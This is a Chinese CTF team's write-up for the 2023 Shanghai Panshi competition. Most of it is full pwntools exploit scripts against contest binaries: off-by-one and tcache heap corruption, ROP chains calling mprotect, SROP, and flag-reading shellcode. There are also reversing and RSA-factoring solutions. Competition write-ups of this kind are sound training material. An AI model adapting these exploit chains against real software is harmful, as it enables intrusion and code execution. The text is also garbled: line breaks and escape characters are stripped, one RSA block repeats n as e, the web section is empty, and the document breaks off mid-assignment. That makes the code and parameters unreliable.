# 2023上海磐石行动-WP -Polaris战队

> 原文: https://www.ctfiot.com/119177.html
> ID: 119177

本次 2023上海磐石行动 

我们Polaris战队在 CTF 赛中排名第四。

PWN

keybox

int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v4; // [rsp+0h] [rbp-90h] BYREF  __int64 v5; // [rsp+8h] [rbp-88h] BYREF  __int64 s[13]; // [rsp+10h] [rbp-80h] BYREF  char buf[8]; // [rsp+7Ch] [rbp-14h] BYREF  int v8; // [rsp+84h] [rbp-Ch]  void (**v9)(void); // [rsp+88h] [rbp-8h]
  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  v9 = (void (**)(void))malloc(0x10uLL);  *v9 = (void (*)(void))begin;  v9[1] = (void (*)(void))end;  (*v9)();  memset(s, 0, 0x50uLL);  puts("There's a box and you should input two keys to get the access to use the boxn");  puts("Input the first key: ");  __isoc99_scanf("%lld", &v5);  puts("Input the second key: ");  __isoc99_scanf("%lld", &v4);  if ( v5 > 2 )    exit(0);  s[v5] = v4;  if ( s[12] == 1 )  {    while ( 1 )    {      menu();      read(0, buf, 8uLL);      v8 = atoi(buf);      switch ( v8 )      {        case 1:          show();          break;        case 2:          add();          break;        case 3:          change();          break;        case 4:          delete();          break;        case 5:          v9[1]();          exit(0);        default:          puts("invaild choicen");          break;      }    }  }  puts("The keys are wrong.");  return 0;}

void __fastcall change(){  char nptr[8]; // [rsp+4h] [rbp-1Ch] BYREF  char buf[8]; // [rsp+Ch] [rbp-14h] BYREF  int v2; // [rsp+14h] [rbp-Ch]  int v3; // [rsp+18h] [rbp-8h]  int v4; // [rsp+1Ch] [rbp-4h]
  if ( num )  {    printf("Please enter the index of item:");    read(0, buf, 8uLL);    v4 = atoi(buf);    if ( itemlist[v4].buf )    {      printf("Please enter the length of item:");      read(0, nptr, 8uLL);      v3 = atoi(nptr);      printf("Please enter the new name of the item:");      v2 = read(0, itemlist[v4].buf, v3);      itemlist[v4].buf[v2] = 0;    }    else    {      puts("invaild index");    }  }  else  {    puts("No item in the box");  }}

#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def add(size, content):    sh.sendlineafter(b'Your choice:', b'2')    sh.sendlineafter(b'Please enter the length of the item:', str(size).encode())    sh.sendafter(b'Please enter the name of item:', content)
def edit(index, size, content):    sh.sendlineafter(b'Your choice:', b'3')    sh.sendlineafter(b'Please enter the index of item:', str(index).encode())    sh.sendlineafter(b'Please enter the length of item:', str(size).encode())    sh.sendafter(b'Please enter the new name of the item:', content)
sh = remote('116.236.144.37', 23451)sh.sendlineafter(b'Input the first key:', str(-9223372036854775796).encode())sh.sendlineafter(b'Input the second key:', str(1).encode())
add(0x18, b'n')edit(-0x398, 8, p64(0x401765)[:7])sh.sendlineafter(b'Your choice:', b'2')sh.sendlineafter(b'Please enter the length of the item:', str(8).encode())
sh.interactive()

ssql

void __fastcall edit_column(const char *table_name, const char *column_name){  table *v2; // [rsp+10h] [rbp-40h]  column *dest; // [rsp+18h] [rbp-38h]  __int64 buf[6]; // [rsp+20h] [rbp-30h] BYREF
  buf[5] = __readfsqword(0x28u);  v2 = seek_table(table_name);  memset(buf, 0, 0x20);  if ( v2 )  {    dest = seek_column(v2, column_name);    if ( dest )    {      puts("Column name:");      read(0, buf, 0x20uLL);      if ( strlen((const char *)buf) <= 0x10 )      {        strcpy(dest->name, (const char *)buf);  // off by one        puts("Column Content: ");        read(0, dest->buf, 0x100uLL);        puts("Done");      }      else      {        puts("Invalid colunm name");      }    }  }  else  {    puts("Table not exits");  }}

#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def create_table(table_name):    sh.sendlineafter(b'mysql > ', b'CREATE TABLE ' + table_name)
def create_column(table_name, column_name):    sh.sendlineafter(b'mysql > ', b'CREATE  ' + column_name + b' FROM ' + table_name)
def show_table(table_name):    sh.sendlineafter(b'mysql > ', b'SHOW TABLE ' + table_name)
def delete_column(table_name, column_name):    sh.sendlineafter(b'mysql > ', b'DELETE  ' + column_name + b' FROM ' + table_name)
def edit_column(table_name, column_name, new_column_name, content):    sh.sendlineafter(b'mysql > ', b'EDIT  ' + column_name + b' FROM ' + table_name)    sh.sendafter(b'Column name:', new_column_name)    sh.sendafter(b'Column Content: ', content)
sh = remote('116.236.144.37', 26713)
create_table(b'table0')
create_column(b'table0', b'column0')create_column(b'table0', b'column1')
delete_column(b'table0', b'column0')delete_column(b'table0', b'column1')
create_column(b'table0', b'column0')create_column(b'table0', b'column1')create_column(b'table0', b'column2')
show_table(b'table0')sh.recvuntil(b'Column Content: ')heap_addr = u64(sh.recvn(6) + b'00') - 0x330success('heap_addr: ' + hex(heap_addr))
edit_column(b'table0', b'column0', b'column0', flat({0x90:b'hijack0', 0xa0:0, 0xa8:
heap_addr + 0x300, 0xb0:
heap_addr}, filler=b'0'))edit_column(b'table0', b'column1', b'1' * 0x10, b'n') # off-by-one
create_column(b'table0', b'column3')create_column(b'table0', b'column4')edit_column(b'table0', b'hijack0', b'hijack0', flat({0x8:
0x291, 0x2e:7}, filler=b'0'))delete_column(b'table0', b'column3')edit_column(b'table0', b'column0', b'column0', flat({0x90:b'hijack0', 0xa0:0, 0xa8:
heap_addr + 0x300, 0xb0:
heap_addr+0x6f0}, filler=b'0'))show_table(b'table0')
sh.recvuntil(b'Column Name: hijack0')sh.recvuntil(b'Column Content: ')libc_addr = u64(sh.recvn(6) + b'00') - 0x1ecbe0success('libc_addr: ' + hex(libc_addr))
edit_column(b'table0', b'column0', b'column0', flat({0x90:b'hijack0', 0xa0:0, 0xa8:
heap_addr + 0x300, 0xb0:
libc_addr+0x1eee48-8}, filler=b'0'))edit_column(b'table0', b'hijack0', b'hijack0', b'/bin/sh0' + p64(libc_addr + 0x52290))delete_column(b'table0', b'hijack0')
sh.interactive()

Hp

void __fastcall edit(arg *a1){  int size; // eax  int find; // [rsp+18h] [rbp-18h]  int i; // [rsp+1Ch] [rbp-14h]  unsigned int v4; // [rsp+20h] [rbp-10h]  int v5; // [rsp+24h] [rbp-Ch]  const char *nptr; // [rsp+28h] [rbp-8h]
  if ( !auth )    exit(1);  find = 0;  for ( i = 0; i <= 15; ++i )  {    if ( a1->inner[i].name && !strcmp(a1->inner[i].name, "Idx") )    {      find = 1;      nptr = a1->inner[i].value;    }  }  if ( find == 1 )  {    v4 = atol(nptr);    if ( v4 <= 0x1F )    {      if ( ptr[v4].buf )      {        if ( strlen(a1->payload) >= (unsigned int)ptr[v4].size )          size = ptr[v4].size;        else          size = strlen(a1->payload);        v5 = size;        memcpy(ptr[v4].buf, a1->payload, size);        ptr[v4].buf[v5] = 0;                    // off-by-one      }    }  }}

#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='info')
sh = remote('116.236.144.37', 20429)
def request(path, headers, payload):    prefix = b'''Host: localhostConnection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7'''.replace(b'n', b'rn')    req = b'POST ' + path + b' HTTP/1.1rn' + prefix    for k in headers:        req += k + b': ' + headers[k] + b'rn'    req += b'rn' + payload    sh.recvuntil(b'parser> ')    sh.send(req)

request(b'/login', {b'Username': b'1' * 0x20 + p8(1), b'Content-Length': str(4).encode()}, b' ')for i in range(10):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')
for i in range(9):    request(b'/delete', {b'Content-Length': str(0).encode(), b'Idx':
str(i).encode()}, b'n')for i in range(9):    request(b'/create', {b'Content-Length': str(0xf8).encode()}, b'a' * 0xf8 + b'n')request(b'/show', {b'Idx': b'0', b'Content-Length': str(0).encode()}, b'n')heap_addr = u64(sh.recvn(8)) - 0x760success('heap_addr: ' + hex(heap_addr))
request(b'/show', {b'Idx': b'7', b'Content-Length': str(0).encode()}, b'n')libc_addr = u64(sh.recvn(8)) - 0x3ebe90success('libc_addr: ' + hex(libc_addr))
request(b'/edit', {b'Idx': b'6', b'Content-Length': str(0xf8).encode()}, b'0' + b'a' * 0xf8) # off-by-one
def edit(index, offset, content):    for i in range(7):        request(b'/edit', {b'Idx': str(index).encode(), b'Content-Length': str(offset + 7 - i).encode()}, b'0' + b'a' * (offset + 7 - i) + p8(0))    for i in range(8):        chr = content[i]        if chr != 0:            request(b'/edit', {b'Idx': str(index).encode(), b'Content-Length': str(offset + i + 1).encode()}, b'0' + b'a' * (offset) + content[:i + 1])
for i in range(7):    request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0xf0 + 7 - i).encode()}, b'0' + b'a' * (0xf0 + 7 - i) + p8(0))request(b'/edit', {b'Idx': b'6', b'Content-Length': str(0xf0+2).encode()}, b'0' + b'a' * (0xf0) + b'x01x01' + p8(0))request(b'/edit', {b'Idx': b'6', b'Content-Length': str(0xf0).encode()}, b'0' + b'a' * (0xf0) + p8(0))
request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x8+7).encode()}, b'0' + b'a' * (0x8+7) + p8(0))request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x8+6).encode()}, b'0' + b'a' * 0x8 + p64(heap_addr + 0x250)[:6] + p8(0))
request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0+7).encode()}, b'0' + b'a' * (0+7) + p8(0))request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0+6).encode()}, b'0' + p64(heap_addr + 0x250)[:6] + p8(0))

for i in range(5):    request(b'/delete', {b'Idx': str(i).encode(), b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'7', b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'8', b'Content-Length': str(0).encode()}, b'0')
request(b'/delete', {b'Idx': b'5', b'Content-Length': str(0).encode()}, b'0')
request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)request(b'/delete', {b'Idx': b'0', b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'1', b'Content-Length': str(0).encode()}, b'0')
request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x20+6).encode()}, b'0' + b'a' * 0x20 + p64(libc_addr + 0x3ee098)[:6] + p8(0))
request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)request(b'/create', {b'Content-Length': str(0x18).encode()}, b'0' + b'a' * 0x18)
request(b'/show', {b'Idx': b'1', b'Content-Length': str(0).encode()}, b'n')
stack_addr = u64(sh.recvn(8)) - 0success('stack_addr: ' + hex(stack_addr))
request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)request(b'/delete', {b'Idx': b'2', b'Content-Length': str(0).encode()}, b'0')request(b'/delete', {b'Idx': b'3', b'Content-Length': str(0).encode()}, b'0')

request(b'/edit', {b'Idx': str(6).encode(), b'Content-Length': str(0x70+6).encode()}, b'0' + b'a' * 0x70 + p64(stack_addr - 0x750)[:6] + p8(0))
request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)request(b'/create', {b'Content-Length': str(0x28).encode()}, b'0' + b'a' * 0x28)
# strace()
rop_chain = flat([    libc_addr + 0x000000000002164f, # pop rdi; ret;    stack_addr & (~0xfff),    libc_addr + 0x0000000000023a6a, # pop rsi; ret;    0x1000,    libc_addr + 0x0000000000001b96, # pop rdx; ret;    7,    libc_addr + 0x000000000001b500, # pop rax; ret;    10,    libc_addr + 0x00000000000d2625, # syscall; ret;    libc_addr + 0x0000000000002b25, # jmp rsp; ])
shellcode = asm('''    mov eax, 0x67616c66 ;// flag    push rax
    mov rsi, rsp    xor eax, eax    mov edx, eax    mov edi, -100    mov eax, 257    syscall ;// openat
    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;// write open() return value
    pop rax    test rax, rax    js over
    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')request(b'/edit', {b'Idx': str(3).encode(), b'Content-Length': str(0+6).encode()}, b'0' + b'a' * 0 + p64(libc_addr + 0x0000000000040558)[:6] + p8(0) + b' ' * 5 + b'abcdabcd' + b' ' * 0x70 + rop_chain + shellcode)
sh.interactive()

mysh

__int64 __fastcall echo(char **args){  dir *v2; // rbx  int v3; // [rsp+14h] [rbp-3Ch]  int i; // [rsp+14h] [rbp-3Ch]  int chunk_size; // [rsp+18h] [rbp-38h]  int v6; // [rsp+1Ch] [rbp-34h]  int size; // [rsp+24h] [rbp-2Ch]  dir *child; // [rsp+28h] [rbp-28h] BYREF  const char *v9; // [rsp+30h] [rbp-20h]  unsigned __int64 v10; // [rsp+38h] [rbp-18h]
  v10 = __readfsqword(0x28u);  v3 = 0;  if ( args[1] )  {    do      ++v3;    while ( args[v3] );    v6 = v3 - 1;    if ( check_redirect(args[v3 - 2]) )    {      for ( i = 1; i < v6; ++i )        printf("%s", args[i]);      puts(args[v6]);      return 1LL;    }    else    {      child = cmd_bak->child;      v9 = args[v6];      if ( (unsigned __int8)check_repeat(&child, v9) != 1 )      {        fprintf(stderr, "mybash: %s: No such filen", v9);        return 1LL;      }      else if ( is_dir(child) )      {        if ( child->buf )        {          chunk_size = get_chunk_size((__int64)child->buf);        }        else        {          chunk_size = 0x1F0;          v2 = child;          v2->buf = (char *)malloc(0x1F0uLL);          if ( !child->buf )            _exit(0);        }        size = strlen(args[v6 - 2]);        while ( size > chunk_size )          chunk_size += 0x1F0;        if ( chunk_size > (unsigned __int64)get_chunk_size((__int64)child->buf) )          child = (dir *)realloc(child->buf, chunk_size);// Structural confusion        strncpy(child->buf, args[v6 - 2], size);        return 1LL;      }      else      {        fprintf(stderr, "mybash: %s: Is a directoryn", v9);        return 1LL;      }    }  }  else  {    putchar('n');    return 1LL;  }}

#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *context.clear(arch='amd64', os='linux', log_level='debug')
def touch(name):    sh.sendlineafter(b'x1B[0m', b'touch ' + name)
def echo(name, content):    sh.sendlineafter(b'x1B[0m', b'echo ' + content + b' > ' + name)
def rm(name):    sh.sendlineafter(b'x1B[0m', b'rm ' + name)
def cat(name):    sh.sendlineafter(b'x1B[0m', b'cat ' + name)
sh = remote('116.236.144.37', 23669)touch(b'0')touch(b'1')touch(b'2')

echo(b'0', b'a')echo(b'1', b'a')rm(b'0')rm(b'1')touch(b'0')touch(b'1')
echo(b'0', b'0')cat(b'0')
heap_addr = u64(sh.recvn(6) + b'00') - 0x730success('heap_addr: ' + hex(heap_addr))
for i in range(10, 20):    touch(str(i).encode())
for i in range(10, 16):    echo(str(i).encode(), b'a')touch(b'100')

echo(b'0', b'a' * 0x18 + p64(heap_addr + 0x1308-0x200)[:6])echo(b'0', b'a' * 0x200 + p16(0x601))
rm(b'13')

echo(b'16', b'a')echo(b'17', b'a')
cat(b'14')
libc_addr = u64(sh.recvn(6) + b'00') - 0x1ecbe0success('libc_addr: ' + hex(libc_addr))
echo(b'18', b'a')echo(b'19', b'a')
rm(b'19')rm(b'18')echo(b'14', p64(libc_addr + 0x1eee48)[:6])
touch(b'18')touch(b'19')
echo(b'18', b'a')
class ucontext_t:    '''    [0x1c0] must be NULL.    '''    length = 0x1c8    bin_str = length * b'0'    rip = 0    rsp = 0    rbx = 0    rbp = 0    r12 = 0    r13 = 0    r14 = 0    r15 = 0    rsi = 0    rdi = 0    rcx = 0    r8 = 0    r9 = 0    rdx = 0
    def __init__(self):        pass
    def set_value(self, offset, value):        if(offset <= 0 or offset > self.length - 8):            raise Exception("Out bound!")        temp = self.bin_str        temp = temp[:
offset] + struct.pack('Q', value) + temp[offset + 8:]        self.bin_str = temp
    def __bytes__(self):        self.set_value(0xe0, self.rip)  # readable        self.set_value(0xa8, self.rip)  # rip        self.set_value(0xa0, self.rsp)        self.set_value(0x80, self.rbx)        self.set_value(0x78, self.rbp)        self.set_value(0x48, self.r12)        self.set_value(0x50, self.r13)        self.set_value(0x58, self.r14)        self.set_value(0x60, self.r15)        self.set_value(0x70, self.rsi)        self.set_value(0x68, self.rdi)        self.set_value(0x98, self.rcx)        self.set_value(0x28, self.r8)        self.set_value(0x30, self.r9)        self.set_value(0x88, self.rdx)
        return self.bin_str
srop = ucontext_t()srop.rip = libc_addr + 0x000000000013b3ea # add eax, 0x10; ret; srop.rsp = heap_addr + 0x2948
pre_payload = b'0' * 0x800 + flat([    b'cccccccc',    libc_addr + 0x0000000000023b6a, # pop rdi; ret;    heap_addr + 0x2000,    libc_addr + 0x000000000002601f, # pop rsi; ret;    0x1000,    libc_addr + 0x0000000000142c92, # pop rdx; ret;    7,    libc_addr + 0x0000000000036174, # pop rax; ret;    0xfffffffa,    libc_addr + 0x000000000013b3ea, # add eax, 0x10; ret;    libc_addr + 0x00000000000630a9, # syscall; ret;    heap_addr + 0x29a0    ]) + asm('''    mov eax, 0x67616c66 ;// flag    push rax
    mov rsi, rsp    xor eax, eax    mov edx, eax    mov edi, -100    mov eax, 257    syscall ;// openat
    push rax    mov rsi, rsp    xor eax, eax    mov edx, eax    inc eax    mov edi, eax    mov dl, 8    syscall ;// write open() return value
    pop rax    test rax, rax    js over
    mov edi, eax    mov rsi, rsp    mov edx, 0x01010201    sub edx, 0x01010101    xor eax, eax    syscall ;// read
    mov edx, eax    mov rsi, rsp    xor eax, eax    inc eax    mov edi, eax    syscall ;// write
over:    xor edi, edi    mov eax, 0x010101e8    sub eax, 0x01010101    syscall ;// exit''')
sh.sendlineafter(b'x1B[0m', pre_payload)
payload = bytes(srop)echo_payload = b'echo ' + p64(libc_addr + 0x54f24)[:6] + b' > ' + b'19'payload = echo_payload + payload[len(echo_payload):]sh.sendlineafter(b'x1B[0m', payload)
sh.interactive()

changeaddr

from pwn import *p=remote("116.236.144.37",24589)p.recvuntil("Now you can write one 4 byte value to memory. Where would you like to write?n")p.sendline("804C020")p.recvuntil("What value would you like to write to 0x")p.sendline("804932C")p.recvuntil("input anything to get the final flag, it should be used to lead to a special segment fault!n")p.sendline("a"*1000)p.interactive()

Re

ezEXE

flag 在哪

//flag{UUU123QWE}#include <stdio.h>int __cdecl switch_ca(int a1){    int v2; // [esp+4h] [ebp-4h]
    v2 = 0;    switch (a1)    {    case 0:        return 10;    case 1:        return 9;    case 2:        return 8;    }    return v2;}int main() {
    unsigned char aaa[] =    {      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x77, 0x68, 0x65, 0x72, 0x65,      0x20, 0x69, 0x73, 0x20, 0x74, 0x6F, 0x6D, 0x7D, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x4D, 0x79, 0x20, 0x63, 0x68,      0x65, 0x65, 0x73, 0x65, 0x7D, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x69, 0x20, 0x6D, 0x69, 0x73, 0x73, 0x20, 0x74, 0x6F,      0x6D, 0x7D, 0x00, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x6C, 0x65, 0x74, 0x27, 0x73, 0x20, 0x68, 0x61, 0x76,      0x65, 0x20, 0x61, 0x20, 0x66, 0x75, 0x6E, 0x7D, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x75, 0x20, 0x77, 0x61, 0x6E,      0x74, 0x20, 0x73, 0x74, 0x65, 0x61, 0x6C, 0x20, 0x6D, 0x79,      0x20, 0x63, 0x68, 0x65, 0x65, 0x73, 0x65, 0x7D, 0x00, 0x00,      0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69, 0x20, 0x68,      0x61, 0x76, 0x65, 0x64, 0x20, 0x6C, 0x6F, 0x73, 0x74, 0x20,      0x61, 0x20, 0x63, 0x68, 0x65, 0x65, 0x73, 0x65, 0x7D, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x63, 0x68, 0x65, 0x65, 0x73,      0x65, 0x20, 0x69, 0x73, 0x20, 0x6D, 0x79, 0x20, 0x6C, 0x69,      0x66, 0x65, 0x7D, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x77,      0x68, 0x61, 0x74, 0x20, 0x64, 0x69, 0x64, 0x20, 0x79, 0x6F,      0x75, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x66, 0x6F, 0x72,      0x20, 0x62, 0x72, 0x65, 0x61, 0x6B, 0x66, 0x61, 0x73, 0x74,      0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x6C,      0x65, 0x74, 0x27, 0x73, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20,      0x61, 0x20, 0x64, 0x61, 0x6E, 0x63, 0x69, 0x6E, 0x67, 0x7D,      0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x63, 0x61, 0x6E,      0x20, 0x75, 0x20, 0x70, 0x6C, 0x61, 0x79, 0x20, 0x74, 0x68,      0x65, 0x20, 0x70, 0x69, 0x61, 0x6E, 0x6F, 0x20, 0x66, 0x6F,      0x72, 0x20, 0x6D, 0x65, 0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C,      0x61, 0x67, 0x7B, 0x69, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20,      0x61, 0x20, 0x67, 0x72, 0x65, 0x61, 0x74, 0x20, 0x64, 0x72,      0x65, 0x61, 0x6D, 0x7D, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x69, 0x20, 0x77, 0x61, 0x6E, 0x74, 0x20, 0x67, 0x6F,      0x20, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x65, 0x20, 0x53, 0x6F,      0x75, 0x74, 0x68, 0x20, 0x50, 0x6F, 0x6C, 0x65, 0x7D, 0x00,      0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x6C, 0x65, 0x74,      0x27, 0x73, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61, 0x20,      0x66, 0x69, 0x67, 0x68, 0x74, 0x7D, 0x00, 0x00, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69, 0x27, 0x6D, 0x20, 0x77,      0x6F, 0x72, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x6E, 0x20,      0x61, 0x6E, 0x20, 0x61, 0x6E, 0x74, 0x69, 0x2D, 0x48, 0x75,      0x6C, 0x6B, 0x20, 0x61, 0x72, 0x6D, 0x6F, 0x72, 0x20, 0x7D,      0x00, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69,      0x20, 0x6B, 0x6E, 0x65, 0x77, 0x20, 0x74, 0x6F, 0x6D, 0x20,      0x77, 0x61, 0x73, 0x20, 0x67, 0x6F, 0x69, 0x6E, 0x67, 0x20,      0x74, 0x6F, 0x20, 0x61, 0x74, 0x74, 0x61, 0x63, 0x6B, 0x20,      0x6D, 0x65, 0x20, 0x74, 0x6F, 0x6E, 0x69, 0x67, 0x68, 0x74,      0x7D, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69, 0x27, 0x76,      0x65, 0x20, 0x61, 0x6C, 0x72, 0x65, 0x61, 0x64, 0x79, 0x20,      0x66, 0x69, 0x67, 0x75, 0x72, 0x65, 0x64, 0x20, 0x6F, 0x75,      0x74, 0x20, 0x77, 0x68, 0x61, 0x74, 0x20, 0x74, 0x6F, 0x20,      0x64, 0x6F, 0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x6E, 0x6F, 0x74, 0x20, 0x64, 0x72, 0x75, 0x6E, 0x6B,      0x20, 0x6E, 0x6F, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6E,      0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x6F,      0x68, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x6F, 0x68, 0x7D,      0x00, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69,      0x20, 0x62, 0x65, 0x74, 0x20, 0x69, 0x74, 0x20, 0x77, 0x69,      0x6C, 0x6C, 0x20, 0x72, 0x61, 0x69, 0x6E, 0x20, 0x74, 0x6F,      0x6D, 0x6F, 0x72, 0x72, 0x6F, 0x77, 0x7D, 0x00, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x74, 0x6F, 0x6D, 0x20, 0x74,      0x6F, 0x6C, 0x64, 0x20, 0x6D, 0x65, 0x20, 0x74, 0x68, 0x61,      0x74, 0x20, 0x68, 0x65, 0x20, 0x77, 0x61, 0x73, 0x20, 0x61,      0x63, 0x74, 0x75, 0x61, 0x6C, 0x6C, 0x79, 0x20, 0x61, 0x20,      0x74, 0x69, 0x67, 0x65, 0x72, 0x7D, 0x00    };    unsigned char enc[] =    {      0xD3, 0x38, 0xD1, 0xD3, 0x7B, 0xAD, 0xB3, 0x66, 0x71, 0x3A,      0x59, 0x5F, 0x5F, 0x2D, 0x73    };    unsigned char ida_chars[] =    {      0xD3, 0x38, 0xD1, 0xD3, 0x7B, 0xAD, 0xB3, 0x66, 0x71, 0x3A,      0x59, 0x5F, 0x5F, 0x2D, 0x73, 0x00    };    char ff[] = "e4bdtRV02";    for (int i = 0; i < 15; i++)    {        int tp = 0;        if (i > 9) {            tp = 0;        }        else {            tp = ff[i];        }        enc[i] -= tp;        enc[i] ^= (2+ switch_ca(i % 3));    }    for (int i = 0; i < 15; i++)    {        if (i % 3 == 1)        {            int tp = i * 3;            enc[i] ^= aaa[tp];        }        enc[i] ^= 4;    }}

encrytor

from pwn import *while 1:    p=process("encryptor")    p.wait_for_close()    f=open("flag.txt.enc","rb")    data=f.read()    if b"flag{" in data:        print(data)        break    f.close()    p.close()

WEB

ezpython

CRYPTO

twice

import randomimport gmpy2
def getpq(n,e,d):    while True:        k = e * d - 1        g = random.randint(0, n)        while k%2==0:            k=k//2            temp=gmpy2.powmod(g,k,n)-1            if gmpy2.gcd(temp,n)>1 and temp!=0:                return gmpy2.gcd(temp,n)
n= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769e= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769d= 424184707992085368727036634979681060339188016631126395371395132791009626692092220877797321952063158959159298372653275672949543326347146732580465753892335912633332743258010037527036987474957662424735475674152462914082526658466925646224968182493094690460023505421720259663381122409147914948696061450626153526908753546708693503710352787787701648821693599138777500334149879355898444355846028142814267511986218166066642222930494985736426837825122392760739011897554697p=getpq(n,e,d)print(p)print(p.bit_length())
# 1330695105232178403308347589389568109225300408762713135772243491377491368194279861763438295639020818785204068048385359448702482999321297373194050693266305504361732774180885522917496754164772429217649860498233529377998583386464460137088587755332405498375966098268448285535036622785057248077770458222273685506367134716127451407327154608982175411015201461740953851387587296137170285694551291177618383724329150286322052759389514137701623525822579311667416001870149503
# 1536

import randomimport gmpy2
def getpq(n,e,d):    while True:        k = e * d - 1        g = random.randint(0, n)        while k%2==0:            k=k//2            temp=gmpy2.powmod(g,k,n)-1            if gmpy2.gcd(temp,n)>1 and temp!=0:                return gmpy2.gcd(temp,n)
n= 1330695105232178403308347589389568109225300408762713135772243491377491368194279861763438295639020818785204068048385359448702482999321297373194050693266305504361732774180885522917496754164772429217649860498233529377998583386464460137088587755332405498375966098268448285535036622785057248077770458222273685506367134716127451407327154608982175411015201461740953851387587296137170285694551291177618383724329150286322052759389514137701623525822579311667416001870149503e= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769d= 